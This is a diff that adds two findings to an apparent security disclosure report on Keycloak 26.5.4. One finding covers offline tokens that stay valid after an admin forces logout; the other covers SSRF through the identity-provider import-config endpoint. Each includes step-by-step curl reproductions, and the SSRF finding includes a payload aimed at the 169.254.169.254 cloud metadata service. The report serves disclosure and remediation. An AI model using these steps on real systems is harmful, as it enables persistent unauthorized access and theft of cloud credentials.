@@ -318,6 +318,236 @@ if (provider == null) {
 
 ---
 
+---
+
+## Finding #3 — HIGH
+
+### Vulnerability Title
+**Offline Token Persistence After Admin Session Revocation — Privilege Backdoor**
+
+### Affected Component
+Keycloak Server — Offline Session Management / Token Revocation
+
+### Affected Version
+26.5.4 (latest stable). Default configuration with `offline_access` scope.
+
+### Vulnerability Type
+Improper session revocation / persistent credential after forced logout
+
+### CVSS Score (estimated)
+**7.5 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+
+---
+
+### Technical Description
+
+Keycloak supports "offline tokens" — long-lived refresh tokens issued when a client requests the `offline_access` scope. These tokens are stored in the database as offline sessions and are intended to function across multiple user login sessions (e.g., for background sync jobs).
+
+**The vulnerability:** When an administrator performs incident response actions after a compromise (force-logout all sessions, push-revocation), offline tokens remain fully valid and can be used to obtain new access tokens indefinitely. Furthermore, the Keycloak admin REST API provides **no working endpoint to delete individual offline sessions** — the `DELETE` endpoints return `HTTP 404`.
+
+**Confirmed behaviors (all tested on Keycloak 26.5.4):**
+
+| Admin Action | Effect on Offline Token |
+|---|---|
+| `POST /admin/realms/{r}/users/{id}/logout` | ❌ No effect — offline token still valid |
+| `POST /admin/realms/{r}/push-revocation` (notBefore push) | ❌ No effect — offline token still valid |
+| `DELETE /admin/realms/{r}/users/{id}/offline-sessions/{clientId}` | ❌ 404 Not Found |
+| `DELETE /admin/realms/{r}/sessions/{sessionId}` | ❌ 404 Not Found (session not found) |
+| **Change user password** (only working mitigation) | ✅ Invalidates offline token |
+
+**Default realm configuration that makes this worse:**
+- `revokeRefreshToken: false` (default) — offline tokens are not rotated on use
+- `offlineSessionMaxLifespanEnabled: false` (default) — offline sessions never expire
+
+This means an attacker who obtains an offline token maintains **unlimited, persistent access** regardless of incident response, unless the victim's password is explicitly changed.
+
+---
+
+### Preconditions
+
+1. Attacker must first obtain an offline token (requires user credentials or another auth vector)
+2. The targeted client must have `offline_access` scope available (default in standard Keycloak installation)
+3. Admin must attempt forced logout and/or push-revocation without also changing the user's password
+
+---
+
+### Step-by-Step Reproduction
+
+**Setup:**
+- Realm: `test`, Client: `test-confidential` (secret: `mysecret123`)
+- User: `testuser / Password123`
+
+**Step 1 — Attacker gets offline token:**
+```bash
+OFFLINE_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=password&username=testuser&password=Password123&scope=offline_access")
+OFFLINE_TOKEN=$(echo "$OFFLINE_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")
+```
+
+**Step 2 — Admin forces logout of all user sessions:**
+```bash
+# Admin token
+ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
+  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+# Force logout ALL sessions
+curl -s -o /dev/null -w "HTTP %{http_code}" -X POST \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  "http://46.101.162.187:8080/admin/realms/test/users/834f6655-5cb3-46ed-b47e-0e50a139dc6c/logout"
+# → HTTP 204 (all active sessions deleted)
+```
+
+**Step 3 — Attacker's offline token still works:**
+```bash
+curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN"
+```
+```json
+{
+  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6bGZh...",
+  "token_type": "Bearer",
+  "scope": "openid offline_access profile email"
+}
+```
+
+**Step 4 — Admin pushes notBefore (forced revocation):**
+```bash
+curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
+  "http://46.101.162.187:8080/admin/realms/test/push-revocation"
+# → {}
+```
+
+**Step 5 — Offline token STILL works after notBefore:**
+```bash
+curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
+  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN"
+# → Returns VALID access_token
+```
+
+**Step 6 — Admin attempts to delete offline sessions (fails):**
+```bash
+# DELETE offline sessions — returns 404
+curl -s -o /dev/null -w "HTTP %{http_code}" -X DELETE \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  "http://46.101.162.187:8080/admin/realms/test/users/834f6655.../offline-sessions/$CLIENT_UUID"
+# → HTTP 404
+
+# GET offline sessions — still shows active sessions
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
+  "http://46.101.162.187:8080/admin/realms/test/users/834f6655.../offline-sessions/$CLIENT_UUID" \
+  | python3 -c "import sys,json; print(len(json.load(sys.stdin)), 'offline sessions still active')"
+# → 6 offline sessions still active
+```
+
+**Automated PoC:** `bash poc4_offline_token_persistence.sh`
+
+---
+
+### Security Impact
+
+- **Compromised account recovery is incomplete**: When an organization detects a compromised account and forces logout, the attacker's offline token maintains full authentication capability
+- **No admin UI indication**: Keycloak admin console's user detail page does not clearly distinguish offline sessions from regular sessions, and the "log out" action does not affect offline sessions
+- **Infinite persistence**: With default settings (`revokeRefreshToken: false`, `offlineSessionMaxLifespanEnabled: false`), a single offline token grants permanent access
+- **Bypasses notBefore policy**: The standard revocation mechanism (push-revocation) used for compromised clients/users has no effect on offline sessions
+
+---
+
+### Remediation Recommendation
+
+1. **Implement working DELETE endpoint for offline sessions** — `DELETE /admin/realms/{realm}/users/{id}/offline-sessions/{clientId}` should delete the offline sessions, not return 404
+2. **Include offline sessions in user force-logout** — `POST /admin/realms/{realm}/users/{id}/logout` should revoke offline sessions for the user, not just active sessions
+3. **Apply notBefore policy to offline sessions** — When `push-revocation` sets a new `notBefore` timestamp, offline session refresh tokens issued before that time should be invalidated
+4. **Enable `revokeRefreshToken` by default** — Requiring offline token rotation on use limits the window of abuse
+5. **Add UI warning** — The admin console should clearly indicate when a user has active offline sessions and provide a way to terminate them
+
+---
+
+---
+
+## Finding #4 — MEDIUM
+
+### Vulnerability Title
+**SSRF via Identity Provider `import-config` Endpoint — Internal Network Access**
+
+### Affected Component
+Keycloak Server — Admin REST API — `/admin/realms/{realm}/identity-provider/import-config`
+
+### Affected Version
+26.5.4 (latest stable)
+
+### Vulnerability Type
+Server-Side Request Forgery (SSRF)
+
+### CVSS Score (estimated)
+**6.5 (Medium)** — AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N
+
+---
+
+### Technical Description
+
+The Identity Provider import-config endpoint accepts a JSON body with a `fromUrl` parameter. Keycloak makes a server-side HTTP GET request to the specified URL to download an OIDC discovery document. No URL allowlist or denylist is enforced, allowing an attacker with the `manage-identity-providers` realm role to:
+
+1. Probe internal network ports (timing-based port scanning)
+2. Access internal HTTP services (internal APIs, metadata endpoints)
+3. In cloud deployments: access instance metadata (AWS: `169.254.169.254`, GCP, Azure)
+
+The vulnerability is triggered by any user with the `manage-identity-providers` client role in `realm-management` — this includes realm administrators and any user granted that role.
+
+---
+
+### Reproduction
+
+**Setup (requires admin token):**
+```bash
+ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
+  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+```
+
+**Trigger SSRF to internal HTTP server:**
+```bash
+# On attacker machine: python3 -m http.server 9999 --bind 127.0.0.1
+
+curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"providerId":"oidc","fromUrl":"http://127.0.0.1:9999/.well-known/openid-configuration"}' \
+  "http://46.101.162.187:8080/admin/realms/test/identity-provider/import-config"
+```
+
+**Evidence — HTTP server receives Keycloak's outbound request:**
+```
+127.0.0.1 - - [21/Feb/2026 03:56:51] "GET /.well-known/openid-configuration HTTP/1.1" 404 -
+```
+
+**Cloud metadata access attempt (returns 500 but connection is attempted):**
+```bash
+curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"providerId":"oidc","fromUrl":"http://169.254.169.254/latest/meta-data/"}' \
+  "http://46.101.162.187:8080/admin/realms/test/identity-provider/import-config"
+```
+
+**Automated PoC:** `bash poc5_ssrf_idp_import.sh`
+
+---
+
+### Security Impact
+
+- **Internal network enumeration**: Attackers with `manage-identity-providers` role can use response timing to determine which internal ports/hosts are open
+- **Internal service access**: On networks with internal APIs, this allows read access to any HTTP endpoint accessible from the Keycloak server
+- **Cloud metadata**: In AWS/GCP/Azure deployments, the instance metadata service at `169.254.169.254` may be accessible, potentially exposing IAM credentials
+- **Multi-tenant escalation**: In multi-tenant Keycloak deployments, realm admins of one tenant can probe internal infrastructure they would not otherwise have access to
+
+---
+
+### Remediation Recommendation
+
+1. **URL allowlist**: Only allow HTTPS URLs for import-config; block private IP ranges (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`), and link-local (`169.254.0.0/16`)
+2. **SSRF protection library**: Use a network-level SSRF protection library that validates URLs before outbound connections are made
+3. **Metadata service protection**: Deploy Keycloak with IMDSv2 required (AWS) or equivalent cloud protections
+
+---
+
 ## Test Environment Details
 
 | Property | Value |
